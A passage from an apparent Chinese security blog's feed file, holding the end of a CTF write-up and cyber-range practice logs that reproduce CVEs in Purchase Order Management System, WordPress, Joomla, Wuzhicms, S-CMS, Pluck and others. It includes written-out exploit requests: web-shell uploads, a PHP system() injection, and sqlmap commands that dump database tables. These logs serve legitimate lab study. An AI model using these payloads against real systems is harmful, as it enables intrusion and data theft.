src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711135859721.png" alt="image-20240711135859721"></p><p>pk压缩包解压，得到两个bin文件，一个meta.json，digital-1.bin文件头是<SALEAE></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711135924169.png" alt="image-20240711135924169"></p><p>查资料，用Logic逻辑分析仪，8.68微秒是115,207的比特率</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711140111206.png" alt="image-20240711140111206"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711140027493.png" alt="image-20240711140027493"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTB&#123;547311173_n37w02k_c0mp20m153d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜靶场练习记录2</title>
      <link href="/2024/07/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%952/"/>
      <url>/2024/07/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<h1 id="春秋云镜靶场练习记录2"><a href="#春秋云镜靶场练习记录2" class="headerlink" title="春秋云镜靶场练习记录2"></a>春秋云镜靶场练习记录2</h1><h2 id="漏洞靶标"><a href="#漏洞靶标" class="headerlink" title="漏洞靶标"></a>漏洞靶标</h2><h3 id="免费靶标"><a href="#免费靶标" class="headerlink" title="免费靶标"></a>免费靶标</h3><h4 id="CVE-2023-2130"><a href="#CVE-2023-2130" class="headerlink" title="CVE-2023-2130"></a>CVE-2023-2130</h4><blockquote><p>在SourceCodester采购订单管理系统1.0中发现了一项被分类为关键的漏洞。受影响的是组件GET参数处理器的文件&#x2F;admin&#x2F;suppliers&#x2F;view_details.php中的一个未知函数。对参数id的操纵导致了SQL注入。可以远程发起攻击。</p></blockquote><p>想试试其他漏洞，看看环境不用sql行不行，搜Purchase Order Management System漏洞就行，用了一个文件上传的漏洞，主要要去掉路径payload中的&#x2F;purchase_order&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /classes/SystemSettings.php?f=update_settings HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 880</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: http://localhost/purchase_order/admin/?page=system_info</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=s87kdnnrqs6s4qkbpf0vps3gi4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;short_name&quot;</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;company_name&quot;</span><br><span class="line"></span><br><span class="line">v</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;company_email&quot;</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;company_address&quot;</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;cover&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY--</span><br></pre></td></tr></table></figure><p>注意要爆破一下文件名的时间戳</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708132833063.png" alt="image-20240708132833063"></p><p>然后找mysql配置文件的账号密码，再执行mysql命令，本来想弹shell到vps上的，不知道咋地没成功，能ping通</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708132907012.png" alt="image-20240708132907012"></p><h4 id="CVE-2023-1313"><a href="#CVE-2023-1313" class="headerlink" title="CVE-2023-1313"></a>CVE-2023-1313</h4><blockquote><p>cockpit在2.4.1版本之前存在任意文件上传漏洞PS：通过在浏览器中打开&#x2F;install来运行安装</p></blockquote><p>&#x2F;install，得到admin&#x2F;admin</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708133839169.png" alt="image-20240708133839169"></p><p>可以任意文件上传，且获取路径</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708134117235.png" alt="image-20240708134117235"></p><p>拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708134257087.png" alt="image-20240708134257087"></p><h4 id="CVE-2023-0562"><a href="#CVE-2023-0562" class="headerlink" title="CVE-2023-0562"></a>CVE-2023-0562</h4><blockquote><p>银行储物柜管理系统是一个基于网络的应用程序，用于处理存储银行客户贵重物品的银行储物柜。储物柜的所有详细信息都保存在数据库中。银行储物柜管理系统项目是使用 PHP 和 MySQLi 扩展开发的。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bank/blms/banker/index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /banker/index.php HTTP/1.1</span><br><span class="line">Host: eci-2zec8zrguq9lgdmw6s6x.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Length: 34</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://eci-2zec8zrguq9lgdmw6s6x.cloudeci1.ichunqiu.com/bank/blms/banker/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: youdianinfo_historycn=173; PHPSESSID=5foesx51586a9teufn</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=admin*&amp;inputpwd=1&amp;login=</span><br></pre></td></tr></table></figure><p>sqlmap一把梭</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --batch -D blmsdb -T fllllaaaag --dum</span><br><span class="line">p</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708150346539.png" alt="image-20240708150346539"></p><h4 id="CVE-2023-7130"><a href="#CVE-2023-7130" class="headerlink" title="CVE-2023-7130"></a>CVE-2023-7130</h4><blockquote><p>College Notes Gallery 2.0 允许通过“&#x2F;notes&#x2F;login.php”中的参数‘user’进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据.</p></blockquote><p>登录点直接sqlmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: eci-2zefbr8mjm2iimyw3zzb.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Cookie: PHPSESSID=ce38b4b58fe299c6782c66c18b69b3a0</span><br><span class="line">Origin: http://eci-2zefbr8mjm2iimyw3zzb.cloudeci1.ichunqiu.com</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://eci-2zefbr8mjm2iimyw3zzb.cloudeci1.ichunqiu.com/login.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">user=asd*&amp;pass=asd&amp;login=login</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --batch -D notes -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708151302727.png" alt="image-20240708151302727"></p><h4 id="CVE-2023-7107"><a href="#CVE-2023-7107" class="headerlink" title="CVE-2023-7107"></a>CVE-2023-7107</h4><blockquote><p>E-Commerce Website 1.0  允许通过“&#x2F;pages&#x2F;user_signup.php”中的参数‘firstname’、‘middlename’、‘email’、‘address’、‘contact’和‘username’进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p></blockquote><p><a href="https://github.com/h4md153v63n/CVEs/tree/main/E-Commerce_Website">E-Commerce Website V1.0</a></p><p>vuldb的漏洞内容还是很详细的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708154125721.png" alt="image-20240708154125721"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt -p firstname --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch -D electricks -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708160713217.png" alt="image-20240708160713217"></p><h4 id="CVE-2023-7106"><a href="#CVE-2023-7106" class="headerlink" title="CVE-2023-7106"></a>CVE-2023-7106</h4><blockquote><p>E-Commerce Website 1.0 允许通过“&#x2F;pages&#x2F;product_details.php”中的参数“prod_id”进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /pages/product_details.php?prod_id=11* HTTP/1.1</span><br><span class="line">Host: eci-2zegvibmj7wdkdafmp4t.cloudeci1.ichunqiu.com</span><br><span class="line">Cookie: PHPSESSID=96cb8b6170f9f645b732ee5ca7857188</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --threads 10 --random-agent tamper=between,randomcase --dbms mysql --batch -D electricks -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708161229060.png" alt="image-20240708161229060"></p><h4 id="CVE-2023-7105"><a href="#CVE-2023-7105" class="headerlink" title="CVE-2023-7105"></a>CVE-2023-7105</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index_search.php HTTP/1.1</span><br><span class="line">Host: eci-2zecwayridchtmfpppwy.cloudeci1.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">Referer: http://eci-2zecwayridchtmfpppwy.cloudeci1.ichunqiu.com/index_search.php</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://eci-2zecwayridchtmfpppwy.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">x=0&amp;y=0&amp;search=123*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --threads 10 --random-agent tamper=between,randomcase --dbms mysql --batch -D electricks -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708161755312.png" alt="image-20240708161755312"></p><h4 id="CVE-2023-52064"><a href="#CVE-2023-52064" class="headerlink" title="CVE-2023-52064"></a>CVE-2023-52064</h4><blockquote><p>Wuzhicms v4.1.0 被发现存在一个 SQL 注入漏洞，该漏洞通过位于<code>/core/admin/copyfrom.php</code> 的 <code>$keywords</code> 参数触发。</p></blockquote><p>目录扫描能得到Wuzhicms的信息</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708162300557.png" alt="image-20240708162300557"></p><p><a href="https://www.jianshu.com/p/12d28873d4ee">基于MVC架构的PHP代审——wuzhicms v4.1.0</a></p><p>用了个命令执行的漏洞，先访问，admin&#x2F;admin123登录后拿到cookie，再去命令执行</p><p><a href="http://eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com/www/index.php?m=core&f=index&v=login&_su=wuzhicms&_menuid=">http://eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com/www/index.php?m=core&amp;f=index&amp;v=login&amp;_su=wuzhicms&amp;_menuid=</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /www/index.php?m=attachment&amp;f=index&amp;v=set&amp;_su=wuzhicms&amp;submit=1&amp;setting=&lt;%3fphp+system($GLOBALS[&#x27;bthcls&#x27;])%3b%3f&gt; HTTP/1.1</span><br><span class="line">Host: eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1714177552; PHPSESSID=1d0cdfcce717359f805198fa27a5cb3d; Jun_uid=e71ddR%2FVxzCU0QJgIFlPXRmGCBB4yoNBIkbvKGUH; Jun_username=448a%2FDAUS9%2BjbArOFBaKXNKOjyq3o9XAsGiSxfFFM3Fg4Q; Jun_wz_name=9040bAVI7JjBXVXYg2iX97I7pavJTcfI6QjKTh2B1L7iiw; Jun_siteid=7919eFYF19xwo7FrF3qXu7mfgS1yQb3JNGpK8SE7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /www/index.php?m=attachment&amp;f=index&amp;v=listing&amp;_su=wuzhicms&amp;bthcls=mysql+-uroot+-proot+-e+%27use+wuzhicms;select+*+from+flllaaaag%27 HTTP/1.1</span><br><span class="line">Host: eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1714177552; PHPSESSID=1d0cdfcce717359f805198fa27a5cb3d; Jun_uid=e71ddR%2FVxzCU0QJgIFlPXRmGCBB4yoNBIkbvKGUH; Jun_username=448a%2FDAUS9%2BjbArOFBaKXNKOjyq3o9XAsGiSxfFFM3Fg4Q; Jun_wz_name=9040bAVI7JjBXVXYg2iX97I7pavJTcfI6QjKTh2B1L7iiw; Jun_siteid=7919eFYF19xwo7FrF3qXu7mfgS1yQb3JNGpK8SE7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708164817210.png" alt="image-20240708164817210"></p><h4 id="CVE-2023-51048"><a href="#CVE-2023-51048" class="headerlink" title="CVE-2023-51048"></a>CVE-2023-51048</h4><blockquote><p>S-CMS v5.0 被发现存在SQLI。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708165122227.png" alt="image-20240708165122227"></p><p><a href="https://www.freebuf.com/vuls/386377.html">S-CMS的代码审计初探</a></p><p>&#x2F;admin访问后台,admin&#x2F;admin123登录，拿到cookie访问&#x2F;admin&#x2F;ajax.php?type&#x3D;bbs&amp;action&#x3D;edit&amp;B_id&#x3D;1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /admin/ajax.php?B_id=1&amp;action=edit&amp;type=bbs HTTP/1.1</span><br><span class="line">Host: eci-2zefbr8mjm2ik0anxf5e.cloudeci1.ichunqiu.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Cookie: authx=; count_all=0; userx=; passx=; user=admin; pass=7b19569b9317927e14152e312767a351; A_type=1; auth=1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1; newsauth=all; productauth=all; textauth=all; formauth=all; bbsauth=all; PHPSESSID=04de0b6947d9287f30a0bf5a261042d9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">B_content=abc&amp;B_sort=2&amp;B_sh=1*&amp;B_time=123&amp;B_title=abc&amp;B_view=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708182308168.png" alt="image-20240708182308168"></p><h4 id="CVE-2023-50564"><a href="#CVE-2023-50564" class="headerlink" title="CVE-2023-50564"></a>CVE-2023-50564</h4><blockquote><p>Pluck-CMS v4.7.18 中的 &#x2F;inc&#x2F;modules_install.php 组件，攻击者可以通过上传一个精心制作的 ZIP 文件来执行任意代码。</p></blockquote><p>login.php admin123登录</p><p>manage modules&#x2F;install a module</p><p>上传一个shell.zip,里面是info.php，内容是一句话木马</p><p>访问&#x2F;data&#x2F;modules&#x2F;shell&#x2F;info.php即可</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708185510845.png" alt="image-20240708185510845"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜靶场练习记录1</title>
      <link href="/2024/07/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="春秋云镜靶场练习记录1"><a href="#春秋云镜靶场练习记录1" class="headerlink" title="春秋云镜靶场练习记录1"></a>春秋云镜靶场练习记录1</h1><h2 id="漏洞靶标"><a href="#漏洞靶标" class="headerlink" title="漏洞靶标"></a>漏洞靶标</h2><h3 id="免费靶标"><a href="#免费靶标" class="headerlink" title="免费靶标"></a>免费靶标</h3><h4 id="CVE-2022-4230"><a href="#CVE-2022-4230" class="headerlink" title="CVE-2022-4230"></a>CVE-2022-4230</h4><blockquote><p>靶标介绍：</p><p>WP Statistics WordPress 插件13.2.9之前的版本不会转义参数，这可能允许经过身份验证的用户执行 SQL  注入攻击。默认情况下，具有管理选项功能 (admin+) 的用户可以使用受影响的功能，但是该插件有一个设置允许低权限用户也可以访问它。</p></blockquote><p><a href="https://www.cnblogs.com/F12-blog/p/18170169">WordPress CVE-2022-4230复现分析 </a></p><p>打开题目看到icon便能判断为Wordpress，访问&#x2F;admin就能跳转到登录界面</p><p>wordpress可以爆破用户名和密码，但是这里有提示test，同时利用用户信息泄露漏洞也可以知道有哪些用户，密码也是test，笨比字典居然没有test密码</p><p><a href="http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-json/wp/v2/users/">http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-json/wp/v2/users/</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707225922061.png" alt="image-20240707225922061"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707224722600.png" alt="image-20240707224722600"></p><p>登录以后访问<a href="http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce">http://eci-2zefgat4lwwou4tzpbnv.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce</a></p><p>不登录是不会得到这个字符串的，只会有一个0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707224916098.png" alt="image-20240707224916098"></p><p>sqlmap启动就完了，让子弹飞一会儿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\sql.txt --batch -D wordpress -T flag -C flag --dump --flush</span><br><span class="line">这里加flush是因为我的nonce换了，所以要清除缓存，以免使用之前的nonce和cookie</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707230408770.png" alt="image-20240707230408770"></p><h4 id="CVE-2023-27179"><a href="#CVE-2023-27179" class="headerlink" title="CVE-2023-27179"></a>CVE-2023-27179</h4><blockquote><p>GDidees CMS v3.9.1及更低版本被发现存在本地文件泄露漏洞，漏洞通过位于 &#x2F;_admin&#x2F;imgdownload.php 的 filename 参数进行利用。</p></blockquote><p>前台没有CMS特征，指纹识别工具也没判断出来</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232017834.png" alt="image-20240707232017834"></p><p>目录扫描到后台，访问可知为GDidees CMS v3.0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232050418.png" alt="image-20240707232050418"></p><p>goole能搜到的Nday还蛮多的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232439182.png" alt="image-20240707232439182"></p><h4 id="CVE-2023-26469"><a href="#CVE-2023-26469" class="headerlink" title="CVE-2023-26469"></a>CVE-2023-26469</h4><blockquote><p>Jorani是一款开源的员工考勤和休假管理系统，适用于中小型企业和全球化组织，它简化了员工工时记录、休假请求和审批流程，并提供了多语言支持以满足不同地区的需求。在 Jorani 1.0.0 中，攻击者可以利用路径遍历来访问文件并在服务器上执行代码。</p></blockquote><p>打开题目就能发现是jorani v1.0.0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707232726674.png" alt="image-20240707232726674"></p><p><a href="https://blog.csdn.net/weixin_44304678/article/details/134170020">Jorani远程命令执行漏洞 CVE-2023-26469</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707233923936.png" alt="image-20240707233923936"></p><h4 id="CVE-2023-23752"><a href="#CVE-2023-23752" class="headerlink" title="CVE-2023-23752"></a>CVE-2023-23752</h4><blockquote><p>Joomla是一个开源免费的内容管理系统（CMS），基于PHP开发。在其4.0.0版本到4.2.7版本中，存在一处属性覆盖漏洞，导致攻击者可以通过恶意请求绕过权限检查，访问任意Rest API。</p></blockquote><p>借助wappalyzer插件可以看见指纹是joomla</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240707234219786.png" alt="image-20240707234219786"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/index.php/v1/config/application?public=true</span><br></pre></td></tr></table></figure><p>上面的接口找不到，优先找user这类重要性比较高的信息</p><p><a href="https://xz.aliyun.com/t/12175?time__1311=mqmhD5DK7IejhDBdPx2DUh0C34AILLqx&alichlgref=https://t.me/">Joomla未授权访问漏洞(CVE-2023-23752)</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/index.php/v1/users?public=true HTTP/1.1</span><br><span class="line">Host: eci-2zed5tpm2rmi2cqeetlm.cloudeci1.ichunqiu.com</span><br><span class="line">Priority: u=1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: e35f439eaec56252e5f70fd7762ea35a=9a122818dc34e3d77fc210d77469daf9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708000455907.png" alt="image-20240708000455907"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>痛苦的密码学</title>
      <link href="/2024/07/04/%E7%97%9B%E8%8B%A6%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2024/07/04/%E7%97%9B%E8%8B%A6%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
